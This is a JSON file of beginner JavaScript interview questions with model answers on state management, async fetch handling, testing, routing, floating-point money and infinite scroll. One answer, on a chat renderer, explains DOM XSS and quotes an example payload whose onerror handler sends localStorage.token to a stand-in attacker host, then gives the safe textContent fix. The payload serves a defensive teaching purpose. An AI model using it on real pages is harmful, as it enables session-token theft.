@@ -1,0 +1,112 @@
+{
+  "topic": "Projects",
+  "level": "beginner",
+  "questions": [
+    {
+      "id": 1,
+      "type": "theory",
+      "question": "How would you structure a small vanilla-JavaScript app so that adding a feature does not break the UI?",
+      "answer": "Keep one source of truth in plain data — an array of todos, an object of board columns, or a small store — and make the DOM a projection of that data. A render function reads the state and rebuilds the affected part of the UI; event handlers change state and then call render. Do not read values back out of the DOM to decide what the state is, because the DOM can be edited by the user, by CSS or by another script.\n\nThe loop is: event → update state → save (if needed) → render. Keep rendering deterministic and side-effect free, keep persistence separate, and keep network calls at the edges. This is the same idea frameworks formalise, but you can demonstrate it with createElement and textContent. It makes features additive: a new field is added to the state and to render, not patched into five click handlers.",
+      "key_points": [
+        "One source of truth in data, not the DOM",
+        "Event → update state → render",
+        "Render is deterministic and derived from state",
+        "Keep persistence and network at the edges",
+        "New features become additive changes"
+      ]
+    },
+    {
+      "id": 2,
+      "type": "theory",
+      "question": "What async states should a weather dashboard model, and how do you prevent an older request from overwriting a newer one?",
+      "answer": "Model at least four states: idle, loading, success (data) and error (message). Render each explicitly so the user never sees a blank panel with no explanation, and disable or ignore repeat submissions while loading. On success, store the data plus the city it belongs to, so a late response cannot be shown under the wrong heading.\n\nTo prevent stale overwrites, abort the previous request with an AbortController before starting a new one and ignore AbortError in the catch. Alternatively, tag each request with an incrementing id and only apply the response whose id matches the latest. Checking response.ok is mandatory because fetch resolves on 404/500. Finally, always clear the loading flag in a finally block (or after both branches) so a failure does not leave the UI stuck.",
+      "key_points": [
+        "States: idle, loading, success, error",
+        "Abort the previous request with AbortController",
+        "Ignore AbortError; apply only the latest response",
+        "Check response.ok — fetch resolves on HTTP errors",
+        "Clear loading in finally"
+      ]
+    },
+    {
+      "id": 3,
+      "type": "theory",
+      "question": "You built a Todo app. What would you test first, and which parts would you mock?",
+      "answer": "Test the pure logic first: adding an item does not mutate the input array, toggling flips only the matching id, and remaining counts incomplete items, including the empty list. These tests are fast and precise, and they cover the rules the UI depends on. Next, test the DOM wiring: submit the form, assert that the new item is rendered and persisted; click an item, assert the done state. Use jsdom and real DOM APIs.\n\nMock only boundaries you do not control: the network (fetch), the clock (timers) and storage if you want isolation. Do not mock the reducer you are testing. For the weather project, mock fetch to return ok:false and a rejection, and assert the error state. Coverage is a gap finder, not a goal: check the empty, error and duplicate paths rather than chasing 100%.",
+      "key_points": [
+        "Test pure logic and edge cases first",
+        "Then DOM wiring with jsdom",
+        "Mock fetch, timers and storage only",
+        "Never mock the function under test",
+        "Use coverage to find gaps, not as a score"
+      ]
+    },
+    {
+      "id": 4,
+      "type": "coding",
+      "question": "Write a tiny store with getState, setState and subscribe. setState should merge a partial object and notify subscribers only when something changed.",
+      "starter_code": "export function createStore(initial) {\n  // your code\n}\n\nconst store = createStore({ count: 0, name: \"Kakade\" });\nconst unsubscribe = store.subscribe((state) => console.log(state));\nstore.setState({ count: 1 });\nstore.setState({ count: 1 });\nunsubscribe();\nstore.setState({ count: 2 });",
+      "answer": "export function createStore(initial) {\n  let state = { ...initial };\n  const listeners = new Set();\n\n  return {\n    getState: () => state,\n    setState(patch) {\n      const next = { ...state, ...patch };\n      const changed = Object.keys(patch).some((key) => !Object.is(next[key], state[key]));\n      if (!changed) return;\n      state = next;\n      for (const listener of listeners) listener(state);\n    },\n    subscribe(listener) {\n      listeners.add(listener);\n      return () => listeners.delete(listener);\n    },\n  };\n}\n\nconst store = createStore({ count: 0, name: \"Kakade\" });\nconst unsubscribe = store.subscribe((state) => console.log(state));\nstore.setState({ count: 1 }); // { count: 1, name: 'Kakade' }\nstore.setState({ count: 1 }); // no log — value unchanged\nunsubscribe();\nstore.setState({ count: 2 }); // no log — unsubscribed\n\nSpreading produces a new object, so subscribers can compare references. The changed check prevents pointless renders, and returning the unsubscribe function from subscribe makes cleanup explicit — the same shape used by many state libraries. A Set avoids duplicate listeners; notification is synchronous, so a listener that calls setState can recurse, which is worth guarding in a larger store.",
+      "key_points": [
+        "Keep state in a closure; expose getState",
+        "Merge patches with spread into a new object",
+        "Skip notification when values are unchanged",
+        "Set of listeners; subscribe returns unsubscribe",
+        "Notification is synchronous — guard against recursion"
+      ]
+    },
+    {
+      "id": 5,
+      "type": "coding",
+      "question": "Write matchRoute(routes, path) for the mini router. Each route has a name and a pattern with :params; return { name, params } or null.",
+      "starter_code": "const routes = [\n  { name: \"home\", pattern: \"/\" },\n  { name: \"user\", pattern: \"/users/:id\" },\n];\n\nconsole.log(matchRoute(routes, \"/users/42\"));\nconsole.log(matchRoute(routes, \"/nope\"));",
+      "answer": "function matchRoute(routes, path) {\n  const parts = path.split(\"/\").filter(Boolean);\n\n  for (const route of routes) {\n    const pattern = route.pattern.split(\"/\").filter(Boolean);\n    if (pattern.length !== parts.length) continue;\n\n    const params = {};\n    const ok = pattern.every((segment, i) => {\n      if (segment.startsWith(\":\")) {\n        params[segment.slice(1)] = decodeURIComponent(parts[i]);\n        return true;\n      }\n      return segment === parts[i];\n    });\n\n    if (ok) return { name: route.name, params };\n  }\n  return null;\n}\n\nconsole.log(matchRoute(routes, \"/users/42\"));\n// { name: 'user', params: { id: '42' } }\nconsole.log(matchRoute(routes, \"/nope\"));\n// null\n\nSplitting both sides avoids fragile regex concatenation and makes segment count part of the match. Dynamic segments start with \":\" and are decoded, so %20 becomes a space. Returning null lets the caller render 404. For real apps, also normalise trailing slashes and decode only once; injecting the param into the page must still go through textContent, never innerHTML.",
+      "key_points": [
+        "Split path and pattern into segments",
+        "Compare segment counts first",
+        "Collect :params and decodeURIComponent",
+        "Return null for no match → caller renders 404",
+        "Render params with textContent"
+      ]
+    },
+    {
+      "id": 6,
+      "type": "trap",
+      "question": "This chat renderer looks fine. What is the security bug, and what is the fix?\n\nconst { user, text } = JSON.parse(event.data);\nlist.innerHTML += `<li>${user}: ${text}</li>`;",
+      "answer": "It is DOM XSS. The message text is concatenated into HTML, so a payload such as <img src=x onerror=\"fetch('https://evil.example/?t='+localStorage.token)\"> becomes a real element and its handler runs with your origin. The user field is equally dangerous. Using += also re-parses the entire list on every message, destroying and recreating existing nodes, which loses listeners and scroll state.\n\nThe fix is to build a node and set text:\n\nconst li = document.createElement(\"li\");\nli.textContent = `${user}: ${text}`;\nlist.append(li);\n\nIf messages must support formatting, sanitize with an allowlist (DOMPurify) and then assign, but plain text is the right default. Never let network data decide the HTML structure.",
+      "key_points": [
+        "Concatenating message data into innerHTML is DOM XSS",
+        "onerror/onload handlers execute even though <script> may not",
+        "Use createElement + textContent + append",
+        "innerHTML += re-parses and destroys existing nodes",
+        "Sanitize only if rich text is genuinely required"
+      ]
+    },
+    {
+      "id": 7,
+      "type": "trap",
+      "question": "Why is this expense total wrong, and how should the data be stored?\n\nconst expenses = [0.1, 0.2];\nconsole.log(expenses.reduce((sum, n) => sum + n, 0));",
+      "answer": "It prints 0.30000000000000004, not 0.3. JavaScript numbers are IEEE 754 binary64, and 0.1 and 0.2 have no exact binary representation, so the sum carries a tiny error. Formatting that with toFixed(2) hides it, but comparisons and repeated additions accumulate more error. For money this is unacceptable.\n\nStore integer minor units — paise or cents — and format only for display:\n\nconst expenses = [10, 20]; // paise\nconst total = expenses.reduce((sum, n) => sum + n, 0); // 30\nnew Intl.NumberFormat(\"en-IN\", { style: \"currency\", currency: \"INR\" }).format(total / 100); // ₹0.30\n\nKeep amounts as integers through storage and arithmetic, convert to major units only at the render boundary, and never parse formatted currency strings back into floats.",
+      "key_points": [
+        "0.1 + 0.2 is 0.30000000000000004 in binary64",
+        "toFixed hides the error but does not fix arithmetic",
+        "Store integer paise/cents",
+        "Format with Intl only at the display boundary",
+        "Do not parse formatted currency back to float"
+      ]
+    },
+    {
+      "id": 8,
+      "type": "trap",
+      "question": "The infinite gallery fires three requests for page 1. The observer code checks isIntersecting. Why, and what guards are missing?",
+      "answer": "IntersectionObserver can call the callback more than once while the sentinel remains visible, and it also fires immediately on observe(). If the callback starts a fetch without a synchronous guard, every call sees isIntersecting true and page still 1, so three requests go out before any of them resolves. The same happens on fast scrolling and on re-render if the observer is recreated.\n\nAdd a loading flag set synchronously before the await and cleared in finally, increment the page only after a successful append, and dedupe by id in case the server returns overlapping pages. Disconnect the observer when there is no next page, and handle errors so a failed request does not leave loading true forever. If the observer is recreated on every render, disconnect the old one first — otherwise handlers multiply and leak.",
+      "key_points": [
+        "Observer fires on observe() and can repeat while visible",
+        "Set a synchronous loading guard before await",
+        "Increment page only after success",
+        "Dedupe ids for overlapping pages",
+        "Disconnect old observers and handle errors"
+      ]
+    }
+  ]
+}
